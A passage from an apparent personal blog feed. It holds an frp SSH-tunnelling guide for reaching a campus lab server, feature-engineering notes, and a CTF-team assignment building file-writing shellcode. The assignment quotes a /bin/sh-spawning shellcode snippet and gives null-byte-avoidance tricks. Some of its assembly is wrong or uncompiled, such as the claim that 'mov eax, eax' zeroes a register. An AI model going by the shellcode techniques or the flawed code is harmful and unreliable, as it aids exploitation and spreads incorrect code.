<p>After <code>x = self.conv2(x)</code>, the size shrinks to 10 or 11. After max-pooling, the size becomes 5 as expected.</p>
]]></content>
      <tags>
        <tag>Deep-Learning</tag>
      </tags>
  </entry>
  <entry>
    <title>Crowd Simulation as Course Design</title>
    <url>/2022/03/05/Crowd-Simulation-as-Course-Design/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>Establish SSH Connection to Servers in School</title>
    <url>/2021/07/10/Establish-SSH-Connection-to-Servers-in-School/</url>
    <content><![CDATA[<h2 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h2><p>前几天师兄发了台实验室的服务器给我了，让我去搭一搭fabric的环境。</p>
<p>fabric的环境可以搭，但是搭完我还得回家。我回去了咋办？</p>
<p>实验室的服务器又是直接接在校园网内网的，那感觉意味着可以不用做了？（快进到摸鱼</p>
<p>实际上回家的话还是可以连得上的，下面是操作流程：</p>
<h2 id="Prerequisite"><a href="#Prerequisite" class="headerlink" title="Prerequisite"></a>Prerequisite</h2><p>一开始的准备是需要你有两台服务器：</p>
<ul>
<li>A：实验室的服务器（在内网，没有公网IP）</li>
<li>B：有公网IP的服务器（在外网，一般可以是各大云的ECS弹性云服务器）</li>
</ul>
<p>使用到的软件是<code>frp</code>，我们通过在两个服务器都部署<code>frp</code>来进行ssh内网穿透。</p>
<a id="more"></a>
<h2 id="Configuration-on-Server-A"><a href="#Configuration-on-Server-A" class="headerlink" title="Configuration on Server A"></a>Configuration on Server A</h2><p>首先把<code>frp</code>下载下来</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> wget https://github.com/fatedier/frp/releases/download/v0.37.0/frp_0.37.0_linux_amd64.tar.gz</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> tar zxvf frp_0.37.0_linux_amd64.tar.gz</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> mv frp_0.37.0_linux_amd64 frp</span></span><br></pre></td></tr></table></figure>
<p>把<code>frpc</code>有关的都删除了，然后保持默认的7000端口不用更改，用screen开一个frp的后台</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rm -rf frpc*</span><br><span class="line">vim frps.ini</span><br><span class="line">screen -dmS frp</span><br><span class="line">screen -r frp</span><br></pre></td></tr></table></figure>
<p>最后运行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./frps -c ./frps.ini &amp;</span><br></pre></td></tr></table></figure>
<p>这个时候会跳出来一些信息，这表示左边已经正常连接了。</p>
<h2 id="Configuration-on-Server-B"><a href="#Configuration-on-Server-B" class="headerlink" title="Configuration on Server B"></a>Configuration on Server B</h2><p>当然也把<code>frp</code>下载下来，不过这时跟<code>frps</code>有关的就可以都删除了。这里就不贴命令了。</p>
<p>然后需要按照IP信息配置一下<code>frpc.ini</code>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr &#x3D; x.x.x.x（B的公网IP）</span><br><span class="line">server_port &#x3D; 7000</span><br><span class="line">[ssh]</span><br><span class="line">type &#x3D; tcp</span><br><span class="line">local_ip &#x3D; x.x.x.x（A的内网IP）</span><br><span class="line">local_port &#x3D; 22</span><br><span class="line">remote_port &#x3D; 6000</span><br></pre></td></tr></table></figure>
<p>A的内网IP并不是<code>127.0.0.1</code>，特别是在校园网环境下更是不可能，直接填在校园网上可以ssh连通的那个IP。</p>
<p>配置的意思是A通过打开6000端口可以接入本地的22端口，22端口也就是默认进shell的端口。</p>
<p>A跟B的7000端口通信，此时B访问自己的6000端口就可以接入A。</p>
<p>当然别忘记运行：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">screen -dmS frp</span><br><span class="line">screen -r frp</span><br><span class="line">./frpc -c ./frpc.ini &amp;</span><br></pre></td></tr></table></figure>
<p>此时只要前面A服务器没有timeout，就应该会在两边弹出有新ssh连接的信息，这就说明ssh的反向代理打通了。</p>
<h2 id="Ways-to-Get-Access-to-A"><a href="#Ways-to-Get-Access-to-A" class="headerlink" title="Ways to Get Access to A"></a>Ways to Get Access to A</h2><h3 id="Brute-force-Way"><a href="#Brute-force-Way" class="headerlink" title="Brute-force Way"></a>Brute-force Way</h3><p>本来想连到B的7000端口上面去，可是Connection Closed by remote host了，就算<code>hosts.allow</code>、<code>hosts.deny</code>、安全组都把7000端口放通了都还是连不上，这就是我的知识盲区了。最后就通过最蠢的两次ssh连上去了。</p>
<p>首先ssh连到B上面去。进到B的shell之后，我们再运行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ssh username@127.0.0.1 -p 6000</span></span><br></pre></td></tr></table></figure>
<p>愿意的话可以再自己设置下ssh免密，不过已经可以打通了。</p>
<h3 id="SSH-in-Multiple-Hops"><a href="#SSH-in-Multiple-Hops" class="headerlink" title="SSH in Multiple Hops"></a>SSH in Multiple Hops</h3><p>其实也可以用一行命令解决：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ssh -t root@xx.xx.xx.xx ssh root@127.0.0.1 -p 6000</span></span><br></pre></td></tr></table></figure>
<p>不仅在console上是如此，也可以在VS Code上直接连进去，方法是通过配置<code>.ssh/config</code>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Host xx.xx.xx.xx</span><br><span class="line">  HostName xx.xx.xx.xx</span><br><span class="line">  User root</span><br><span class="line">  port 22</span><br><span class="line"></span><br><span class="line">Host MyFabricServer</span><br><span class="line">  Hostname 127.0.0.1</span><br><span class="line">  User root</span><br><span class="line">  port 6000</span><br><span class="line">  ProxyJump xx.xx.xx.xx</span><br></pre></td></tr></table></figure>
<p>其中，<code>xx.xx.xx.xx</code>表示B的公网IP。</p>
<h3 id="Multiple-Clients-to-One-Server-Using-frp"><a href="#Multiple-Clients-to-One-Server-Using-frp" class="headerlink" title="Multiple Clients to One Server Using frp"></a>Multiple Clients to One Server Using <code>frp</code></h3><p>其实，B可以做多台内网服务器的中介，方法其实也跟上面类似，不过有一点小小的区别。</p>
<p>把新的需要做反向代理的内网服务器记作C，则同样在C上面配置<code>frpc</code>有关内容，大部分操作与A类似，不过在<code>frpc.ini</code>有更改：</p>
<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = x.x.x.x（B的公网IP）</span><br><span class="line">server_port = 7000</span><br><span class="line"><span class="deletion">- [ssh]</span></span><br><span class="line"><span class="addition">+ [ssh2]</span></span><br><span class="line">type = tcp</span><br><span class="line">local_ip = x.x.x.x（A的内网IP）</span><br><span class="line">local_port = 22</span><br><span class="line"><span class="deletion">- remote_port = 6000</span></span><br><span class="line"><span class="addition">+ remote_port = 5000</span></span><br></pre></td></tr></table></figure>
<p>其实<code>[ssh2]</code>可以改为其他的名字，正如<code>[ssh]</code>也只是一个identifier而已。再记得映射到另一个空闲的端口上。</p>
<p>用screen运行相应命令之后会prompt出started successfully之类的字样，之后不需要去在B上面做修改，在B的shell里面ssh新的5000端口就可以连上了。</p>
<h2 id="SSH-Connection-in-VS-Code"><a href="#SSH-Connection-in-VS-Code" class="headerlink" title="SSH Connection in VS Code"></a>SSH Connection in VS Code</h2><p>试了一下可以在VS Code里面直接连上做好反向代理的内网服务器，大概操作流程是这样的：</p>
<ol>
<li>额外下载一个叫<code>Remote SSH</code>的extension。</li>
<li>点左下角绿色的连接按钮，选择Connect to the Host，然后选择Select SSH configuration file to update，任选一个配置文件。</li>
<li>接下来进入了一个编辑文件的界面，就这样输入：</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Host xx.xx.xx.xx</span><br><span class="line">  HostName xx.xx.xx.xx</span><br><span class="line">  User root</span><br><span class="line">  port 22</span><br><span class="line"></span><br><span class="line">Host MyFabricServer</span><br><span class="line">  Hostname 127.0.0.1</span><br><span class="line">  User root</span><br><span class="line">  port 5000</span><br><span class="line">  ProxyJump xx.xx.xx.xx</span><br></pre></td></tr></table></figure>
<p>其中，<code>xx.xx.xx.xx</code>代表B的公网IP。</p>
<ol>
<li>接下来再点击连接，选择Connect to the Host，选择MyFabricServer，输入相应的密码，两个服务器的密码都输入正确的话就可以进入了。</li>
</ol>
<h2 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h2><p>可能在上面的设置中会出现些问题，此时要注意把已经screen的进程关闭掉。（说关闭还不如说直接杀掉）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> screen -ls</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">kill</span> -9 [your-pid]</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> screen -wipe [your-pid]</span></span><br></pre></td></tr></table></figure>
<p>想要重新尝试的话需要确保两边的screen都没有一个active的，然后才能再次尝试。</p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul>
<li><a href="https://gofrp.org/docs/examples/ssh/">https://gofrp.org/docs/examples/ssh/</a></li>
<li><a href="https://www.jianshu.com/p/a25908b0b6eb?utm_campaign=maleskine&amp;utm_content=note&amp;utm_medium=seo_notes&amp;utm_source=recommendation">https://www.jianshu.com/p/a25908b0b6eb?utm_campaign=maleskine&amp;utm_content=note&amp;utm_medium=seo_notes&amp;utm_source=recommendation</a></li>
<li><a href="https://www.shangmayuan.com/a/22889fff02d84a5e81387434.html">https://www.shangmayuan.com/a/22889fff02d84a5e81387434.html</a></li>
</ul>
]]></content>
      <tags>
        <tag>misc</tag>
      </tags>
  </entry>
  <entry>
    <title>Feature Engineering Learning Notes</title>
    <url>/2021/01/27/Feature-Engineering-Learning-Notes/</url>
    <content><![CDATA[<h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><h3 id="特征的定义"><a href="#特征的定义" class="headerlink" title="特征的定义"></a>特征的定义</h3><p>feature就是从数据中提取出来的有用的属性。</p>
<h3 id="特征工程的定义"><a href="#特征工程的定义" class="headerlink" title="特征工程的定义"></a>特征工程的定义</h3><p>特征工程(Feature Engineering)是机器学习中的一个重要分支，指的是通过运用多种数据处理方法，将把原始数据转化成更好的特征的过程。</p>
<p>特征有优劣之分，更好的特征更适合机器学习，意味着能够训练出更好的结果。</p>
<a id="more"></a>
<h2 id="特征处理"><a href="#特征处理" class="headerlink" title="特征处理"></a>特征处理</h2><h3 id="去除异常数据"><a href="#去除异常数据" class="headerlink" title="去除异常数据"></a>去除异常数据</h3><p>特征清洗即在数据中去除异常数据。常见的去除异常数据方式可以基于简单统计方法借助$3\delta$原则来去除，也可以用KNN算法等内容来处理。</p>
<h3 id="处理缺失数据"><a href="#处理缺失数据" class="headerlink" title="处理缺失数据"></a>处理缺失数据</h3><p>拿数据来训练自然需要各类数据数量较均匀，有缺失会对模型准确度造成影响。</p>
<p>至于如何处理缺失数据，有几个原则：</p>
<ol>
<li>该类数据缺失得太多了，干脆全部丢弃。</li>
<li>缺失得不多的话，可以利用均值或中位数补充少量数据。</li>
<li>利用其他的算法进行缺失数据的预测，做prediction然后补齐。</li>
</ol>
<h3 id="数据采样及均衡操作"><a href="#数据采样及均衡操作" class="headerlink" title="数据采样及均衡操作"></a>数据采样及均衡操作</h3><p>做分类任务的话，正负样本要求数量较均衡，如果给定数据不均衡的话就需要数据采样操作。</p>
<p>数据采样的操作主要有两种：上采样和下采样。</p>
<h4 id="下采样"><a href="#下采样" class="headerlink" title="下采样"></a>下采样</h4><p>当正负两类数据规模都比较大时，可以适当对数据多的那一类进行欠采样。</p>
<h4 id="上采样"><a href="#上采样" class="headerlink" title="上采样"></a>上采样</h4><p>当正负两类规模都比较小时，应该对数据少的那一类做过采样操作，经常可以用到一个叫SMOTE的过采样算法来合成新样本，使得两类规模相当。</p>
<h3 id="特征预处理"><a href="#特征预处理" class="headerlink" title="特征预处理"></a>特征预处理</h3><h4 id="数值数据"><a href="#数值数据" class="headerlink" title="数值数据"></a>数值数据</h4><p>针对普通数值型数据，一般可以使用MinMax或者标准化来做无量纲化操作。</p>
<p>这里的所谓标准化方法，就是处理出均值和方差，每个数据就表示成跟均值差了多少个方差（带正负符号）。</p>
<p>两种方法分别可以在<code>sklearn.preprocessing</code>的<code>StandardScaler</code>和<code>MinMaxScaler</code>找到。</p>
<h4 id="分类数据"><a href="#分类数据" class="headerlink" title="分类数据"></a>分类数据</h4><p>针对分类数据，经常需要转化成OneHot编码，这个操作可以在<code>pandas</code>或者<code>sklearn</code>里做到。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> OneHotEncoder, LabelEncoder</span><br><span class="line"></span><br><span class="line">data = pd.DataFrame(&#123;<span class="string">&#x27;age&#x27;</span>: [<span class="number">4</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">3</span>], <span class="string">&#x27;pet&#x27;</span>: [<span class="string">&#x27;cat&#x27;</span>, <span class="string">&#x27;dog&#x27;</span>, <span class="string">&#x27;dog&#x27;</span>, <span class="string">&#x27;fish&#x27;</span>]&#125;)</span><br><span class="line"><span class="comment"># method 1</span></span><br><span class="line">pet_values = LabelEncoder.fit_transform(data.pet) <span class="comment"># [0, 1, 1, 2]，即离散化</span></span><br><span class="line">OneHotEncoder().fit_transform(pet_values.reshape(-<span class="number">1</span>, <span class="number">1</span>)).toarray()</span><br><span class="line"><span class="comment"># method 2</span></span><br><span class="line">pd.get_dummies(data,columns=[<span class="string">&#x27;pet&#x27;</span>])</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="时间数据"><a href="#时间数据" class="headerlink" title="时间数据"></a>时间数据</h4><p>时间数据最简便的是用<code>pandas</code>中的<code>DatetimeIndex</code>直接做。</p>
]]></content>
      <tags>
        <tag>Machine-Learning</tag>
      </tags>
  </entry>
  <entry>
    <title>First Assignment from Kap0k</title>
    <url>/2021/01/16/First-Assignment-from-Kap0k/</url>
    <content><![CDATA[<h2 id="手撕shellcode"><a href="#手撕shellcode" class="headerlink" title="手撕shellcode"></a>手撕shellcode</h2><p>最后的结果是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\x31\xc0\x50\x68\x66\x69\x6c\x65\x68\x74\x65\x73\x74\x89\xe3\x50\x53\x31\xc9\xb1\x02\xb0\x05\xcd\x80\x89\xc3\x31\xc0\x50\x68\x6f\x72\x6c\x64\x68\x6f\x2c\x20\x77\x68\x68\x65\x6c\x6c\x89\xe1\x50\x51\x31\xd2\xb2\x0c\xb0\x04\xcd\x80\x31\xdb\x31\xc0\xb0\x01\xcd\x80</span><br></pre></td></tr></table></figure>
<h3 id="最初的思路"><a href="#最初的思路" class="headerlink" title="最初的思路"></a>最初的思路</h3><p>查了很久资料，最后才在google上找到有用的东西。（用i386编译出来的）</p>
<p>最简单的写法自然是这样：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">section .data</span><br><span class="line">    msg db &quot;Hello, world!&quot;, 0xa</span><br><span class="line">    len equ $ - msg</span><br><span class="line">    filename db &quot;sb&quot;</span><br><span class="line"></span><br><span class="line">section .text</span><br><span class="line">global _start</span><br><span class="line">_start:</span><br><span class="line">    ;xor edx, edx</span><br><span class="line">    mov ecx, 2</span><br><span class="line">    mov ebx, filename</span><br><span class="line">    mov eax, 5</span><br><span class="line">    int 0x80</span><br><span class="line">    </span><br><span class="line">    mov ebx, eax</span><br><span class="line">    mov ecx, msg</span><br><span class="line">    mov edx, 12</span><br><span class="line">    mov eax, 4</span><br><span class="line">    int 0x80</span><br><span class="line"></span><br><span class="line">    mov ebx, 0</span><br><span class="line">    mov eax, 1</span><br><span class="line">    int 0x80</span><br></pre></td></tr></table></figure>
<p>这里所运用到的是linux kernel里面的syscall指令，通过<code>int 0x80</code>的软中断来执行底层函数。</p>
<a id="more"></a>
<p>我们用到的有<code>sys_open</code>和<code>sys_write</code>两个函数，他们的用法如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="number">4.</span> sys_write</span><br><span class="line">Syntax: <span class="function"><span class="keyword">ssize_t</span> <span class="title">sys_write</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> fd, <span class="keyword">const</span> <span class="keyword">char</span> * buf, <span class="keyword">size_t</span> count)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line">Source: fs/read_write.c</span><br><span class="line"></span><br><span class="line">Action: write to a file descriptor</span><br><span class="line"></span><br><span class="line">Details:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">5.</span> sys_open</span><br><span class="line">Syntax: <span class="function"><span class="keyword">int</span> <span class="title">sys_open</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> * filename, <span class="keyword">int</span> flags, <span class="keyword">int</span> mode)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line">Source: fs/open.c</span><br><span class="line"></span><br><span class="line">Action: open <span class="keyword">and</span> possibly create a file <span class="keyword">or</span> device</span><br><span class="line"></span><br><span class="line">Details:</span><br></pre></td></tr></table></figure>
<p><code>sys_open</code>的第二个参数<code>flags</code>中，<code>0</code>代表只读，<code>1</code>代表只写，<code>2</code>代表可读写。</p>
<p>这里试了一下，第三个参数可以不用去控制，默认留0没问题。</p>
<p>然后<code>sys_open</code>的返回值是一个文件描述数字，这个概念可以参考stdin是0，stdout是1，反正就是一个在<code>sys_write</code>调用的时候，第一个参数填的值。</p>
<p>然后就是照着规定填好寄存器，最后<code>int 0x80</code>调用一下就可以执行函数了。最后再<code>sys_exit</code>退出就可以了。</p>
<p>编译命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ nasm -f elf helloworld.asm</span><br><span class="line">$ ld -m elf_i386 -s -o shellcode helloworld.o</span><br></pre></td></tr></table></figure>
<p>不过这样编译过后会发现机器码里面一大堆都是<code>\x00</code>，不符合要求；并且存在常量字符串，没法在shellcode中跳到里面的奇妙地址来读取字符串。</p>
<h3 id="Inspiration"><a href="#Inspiration" class="headerlink" title="Inspiration"></a>Inspiration</h3><p>在搜索如何从汇编到shellcode的过程中，看到了一个教怎么弄出shell的教程，它的汇编是这样的：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xor    %eax,%eax</span><br><span class="line">push   %eax</span><br><span class="line">push   $0x68732f2f</span><br><span class="line">push   $0x6e69622f</span><br><span class="line">mov    %esp,%ebx</span><br><span class="line">push   %eax</span><br><span class="line">push   %ebx</span><br><span class="line">mov    %esp,%ecx</span><br><span class="line">mov    $0xb,%al</span><br><span class="line">int    $0x80</span><br></pre></td></tr></table></figure>
<p>仔细研究它的写法，我们下面的解决方案就来自这段汇编的细节。（其实改编下就能用了）</p>
<h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><h4 id="去除-x00"><a href="#去除-x00" class="headerlink" title="去除\x00"></a>去除\x00</h4><p>我们通过几个技巧来实现：</p>
<ol>
<li><code>mov eax, 0</code>转而通过<code>mov eax, eax</code>来实现。</li>
<li><code>mov eax, 1</code>转而通过<code>mov al, 1</code>来实现。（前提是eax高位也没问题）</li>
</ol>
<h4 id="在shellcode中注入常量字符串"><a href="#在shellcode中注入常量字符串" class="headerlink" title="在shellcode中注入常量字符串"></a>在shellcode中注入常量字符串</h4><p>我们没法把我们想要的字符串在被注入的程序中找到，所以还是得存在栈里面。</p>
<p>不过怎么存呢？通过push来存。</p>
<p>然后就有非常强的技巧：将字符串翻转后变成十六进制编码，每8位每8位的push进去，最后从栈顶开始的字符串就是我们想要的字符串。</p>
<p>但是又有问题：这样会不会又产生<code>\x00</code>？</p>
<p>其实有可能，所以我们无论如何，长度都补齐到4的整数倍。这样就可以保证没有<code>\x00</code>了。</p>
<p>最终我的shellcode输出至名字为<code>testfile</code>的文件中，输入内容为<code>hello, world</code>。</p>
<p>缺点是<code>testfile</code>必须要先存在然后才能写进去，这应该和我在<code>sys_open</code>的时候，<code>flags</code>的取值有关系。有时间的话再去探究这个参数到底该怎么取。</p>
<img data-src="http://qiniu.garen-wang.top/static/images/First-Assignment-from-Kap0k/objdump.png">
<p>最后通过一个在网上找到的命令，直接提取出了机器码，生成了shellcode，省去了一个字节一个字节手抄出来的麻烦：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ objdump -d .&#x2F;shellcode|grep &#39;[0-9a-f]:&#39;|grep -v &#39;file&#39;|cut -f2 -d:|cut -f1-6 -d&#39; &#39;|tr -s &#39; &#39;|tr &#39;\t&#39; &#39; &#39;|sed &#39;s&#x2F; $&#x2F;&#x2F;g&#39;|sed &#39;s&#x2F; &#x2F;\\x&#x2F;g&#39;|paste -d &#39;&#39; -s |sed &#39;s&#x2F;^&#x2F;&quot;&#x2F;&#39;|sed &#39;s&#x2F;$&#x2F;&quot;&#x2F;g&#39;</span><br></pre></td></tr></table></figure>
<h2 id="汇编快排"><a href="#汇编快排" class="headerlink" title="汇编快排"></a>汇编快排</h2><p>直接用汇编写出快排我做不到，就先写个c出来吧。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> a[] = &#123;<span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">swap</span><span class="params">(<span class="keyword">int</span> *a, <span class="keyword">int</span> *b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> t = *a;</span><br><span class="line">    *a = *b;</span><br><span class="line">    *b = t;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">qsort</span><span class="params">(<span class="keyword">int</span> *start, <span class="keyword">int</span> *end)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len = (end - start);</span><br><span class="line">    <span class="keyword">int</span> pivot = *(start + (len &gt;&gt; <span class="number">1</span>));</span><br><span class="line">    <span class="keyword">int</span> *i = start, *j = end;</span><br><span class="line">    <span class="keyword">while</span>(i &lt;= j) &#123;</span><br><span class="line">        <span class="keyword">while</span>(*i &lt; pivot) i++;</span><br><span class="line">        <span class="keyword">while</span>(*j &gt; pivot) j--;</span><br><span class="line">        <span class="keyword">if</span>(i &lt;= j) swap(i++, j--);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(i &lt; end) qsort(i, end);</span><br><span class="line">    <span class="keyword">if</span>(start &lt; j) qsort(start, j);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    qsort(a, a + <span class="number">10</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, a[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>后来发现汇编里面要写指针的话就好麻烦，干脆重新改一改：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">qsort</span><span class="params">(<span class="keyword">int</span> *a, <span class="keyword">int</span> l, <span class="keyword">int</span> r)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> mid = (l + r) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> pivot = a[mid];</span><br><span class="line">    <span class="keyword">int</span> i = l, j = r;</span><br><span class="line">    <span class="keyword">while</span>(i &lt;= j) &#123;</span><br><span class="line">        <span class="keyword">while</span>(a[i] &lt; pivot) i++;</span><br><span class="line">        <span class="keyword">while</span>(a[j] &gt; pivot) j--;</span><br><span class="line">        <span class="keyword">if</span>(i &lt;= j) swap(a, i++, j--);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(i &lt; r) qsort(a, i, r);</span><br><span class="line">    <span class="keyword">if</span>(l &lt; j) qsort(a, l, j);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>看了师傅的代码，发现可以用r8到r11的这4个寄存器来存，顿时方便了很多。<del>本来还以为要一直存在栈上</del></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">global _start</span><br><span class="line"></span><br><span class="line">section .data</span><br><span class="line">    a: dd 1, 1, 4, 5, 1, 4, 2, 0, 7, 7</span><br><span class="line">section .text</span><br><span class="line">_start:</span><br><span class="line">    mov rdi, a</span><br><span class="line">    xor rsi, rsi</span><br><span class="line">    mov rdx, 10</span><br><span class="line">    call qsort</span><br><span class="line">    mov rax, 60</span><br><span class="line">    xor rdi, rdi</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">swap:</span><br><span class="line">    ; rdi: a, rsi: i, rdx: j</span><br><span class="line">    mov ebx, QWORD [rdi + 4 * rsi]</span><br><span class="line">    mov ecx, QWORD [rdi + 4 * rdx]</span><br><span class="line">    mov QWORD [rdi + 4 * rsi], ecx</span><br><span class="line">    mov QWORD [rdi + 4 * rdx], ebx</span><br><span class="line"></span><br><span class="line">qsort:</span><br><span class="line">    ; rdi: a, rsi: start, rdx: end</span><br><span class="line">    mov r8, rsi ; start</span><br><span class="line">    mov r9, rdx ; end</span><br><span class="line">    mov r10, r8 ; i</span><br><span class="line">    mov r11, r9 ; j</span><br><span class="line">    mov rbx, r9</span><br><span class="line">    add rbx, r8</span><br><span class="line">    sar rbx</span><br><span class="line">    mov ebx, DWORD [r8 + 4 * rbx]</span><br><span class="line">    loop:</span><br><span class="line">        cmp r10, r11</span><br><span class="line">        jg after_loop1</span><br><span class="line">        i_loop:</span><br><span class="line">            mov eax, DWORD [r8 + 4 * r10]</span><br><span class="line">            cmp eax, ebx</span><br><span class="line">            jge j_loop</span><br><span class="line">            inc r10</span><br><span class="line">            jmp i_loop</span><br><span class="line">        j_loop:</span><br><span class="line">            mov eax, DWORD [r8 + 4 * r11]</span><br><span class="line">            cmp eax, ebx</span><br><span class="line">            jle swap_i_j</span><br><span class="line">            dec r11</span><br><span class="line">            jmp j_loop</span><br><span class="line">        swap_i_j:</span><br><span class="line">            cmp r10, r11</span><br><span class="line">            jg loop</span><br><span class="line">            mov rdi, a</span><br><span class="line">            mov rsi, r10</span><br><span class="line">            mov rdx, r11</span><br><span class="line">            call swap</span><br><span class="line">            inc r8</span><br><span class="line">            dec r9</span><br><span class="line">            jmp loop</span><br><span class="line">    after_loop1:</span><br><span class="line">        cmp r10 r9</span><br><span class="line">        jge after_loop2</span><br><span class="line">        mov rdi, a</span><br><span class="line">        mov rsi, r10</span><br><span class="line">        mov rdx, r9</span><br><span class="line">        push r8</span><br><span class="line">        push r9</span><br><span class="line">        push r10</span><br><span class="line">        push r11</span><br><span class="line">        call qsort</span><br><span class="line">        pop r11</span><br><span class="line">        pop r10</span><br><span class="line">        pop r9</span><br><span class="line">        pop r8</span><br><span class="line"></span><br><span class="line">    after_loop2:</span><br><span class="line">        cmp r8 r11</span><br><span class="line">        jge return</span><br><span class="line">        mov rdi, a</span><br><span class="line">        mov rsi, r8</span><br><span class="line">        mov rdx, r11</span><br><span class="line">        push r8</span><br><span class="line">        push r9</span><br><span class="line">        push r10</span><br><span class="line">        push r11</span><br><span class="line">        call qsort</span><br><span class="line">        pop r11</span><br><span class="line">        pop r10</span><br><span class="line">        pop r9</span><br><span class="line">        pop r8</span><br><span class="line">    return:</span><br><span class="line">        ret</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>没编译过，不过觉得问题不大。但愿如此（x</p>
<p>Jan 17 upd：重新用熟悉的AT&amp;T语法自己手写了一遍汇编快排，这次用了指针，看上去比较清晰：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.globl _start</span><br><span class="line">.section .data</span><br><span class="line">    array:</span><br><span class="line">        .int 1, 1, 4, 5, 1, 4, 2, 0, 7, 7</span><br><span class="line"></span><br><span class="line">.section .text</span><br><span class="line">qsort:</span><br><span class="line">    # rdi: int* start, rsi: int* end</span><br><span class="line">    pushq %rbp</span><br><span class="line">    movq %rsp, %rbp</span><br><span class="line">    movq %rsi, %rax</span><br><span class="line">    subq %rdi, %rax</span><br><span class="line">    sarq %rax</span><br><span class="line">    addq %rdi, %rax</span><br><span class="line">    movq %rdi, %r8 # start(backup)</span><br><span class="line">    movq %rsi, %r9 # end(backup)</span><br><span class="line">    movq %rdi, %rbx # i</span><br><span class="line">    movq %rsi, %rcx # j</span><br><span class="line">    jmp _init_loop</span><br><span class="line"> </span><br><span class="line">_init_loop:</span><br><span class="line">    cmpq %rcx, %rbx</span><br><span class="line">    jg _recursive1</span><br><span class="line">    jmp _i_loop</span><br><span class="line"></span><br><span class="line">_i_loop:</span><br><span class="line">    cmpq (%rax), (%rbx)</span><br><span class="line">    jge _j_loop</span><br><span class="line">    incq %rbx</span><br><span class="line">    jmp _i_loop</span><br><span class="line"></span><br><span class="line">_j_loop:</span><br><span class="line">    cmpq (%rax), (%rcx)</span><br><span class="line">    jle _swap</span><br><span class="line">    decq %rcx</span><br><span class="line">    jmp _j_loop</span><br><span class="line"></span><br><span 